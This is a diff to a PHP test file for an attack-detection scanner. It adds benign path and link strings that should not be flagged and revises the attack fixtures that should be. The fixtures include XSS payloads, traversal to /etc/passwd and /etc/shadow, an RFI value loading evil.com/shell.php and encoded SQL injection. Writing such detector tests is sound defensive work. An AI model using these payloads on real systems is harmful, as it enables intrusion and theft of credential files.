@@ -122,6 +122,10 @@ class DetectionAccuracyTest extends TestCase
             'markdown heading'    => ["# Getting started\nWelcome", 'markdown headings start with hash-space'],
             'em dash text'        => ['Order #42 -- shipped yesterday', 'double hyphen is ordinary punctuation'],
             'link to html page'   => ['Read more at https://example.com/docs/index.html', 'a link is not remote file inclusion'],
+            'link to txt file'    => ['Download guide at https://example.com/guide.txt', 'links to text files are not remote file inclusion'],
+            'relative path prose' => ['Check image at ../images/logo.png', 'relative paths in prose/forms are not attacks'],
+            'code import path'    => ['import { config } from "../config.js";', 'relative module imports are common in code snippets'],
+            'shell cd tutorial'   => ['Run cd ../../my-project to go up', 'path navigation in tutorials is not an attack'],
             'semicolon then id'   => ['Please send your ID; identity check required', 'not command injection'],
             'semicolon then cat'  => ['tags=music; categories=rock', 'same'],
             'word ending in system'=> ['The ecosystem(2026) report', 'ecosystem is not system()'],
@@ -147,9 +151,9 @@ class DetectionAccuracyTest extends TestCase
             'script tag'         => ['<script>alert(1)</script>', 'baseline'],
             'script slash'       => ['<script/x>alert(1)</script>', 'slash instead of whitespace'],
             'onbegin handler'    => ['<svg><animate onbegin=alert(1)>', 'handler outside the hardcoded list'],
-            'traversal'          => ['../../etc/passwd', 'baseline'],
-            'doubled traversal'  => ['....//....//etc/passwd', 'filter-bypass form'],
-            'encoded traversal'  => ['..%252f..%252fetc%252fpasswd', 'double-encoded'],
+            'lfi etc passwd'     => ['../../etc/passwd', 'LFI attack targeting /etc/passwd'],
+            'lfi shadow'         => ['/etc/shadow', 'LFI attack targeting /etc/shadow'],
+            'rfi remote php'     => ['?file=http://evil.com/shell.php', 'RFI attack with remote script in parameter'],
             'encoded sqli'       => ['1%27+OR+%271%27%3D%271', 'still encoded when it reaches the scanner'],
         ];
     }
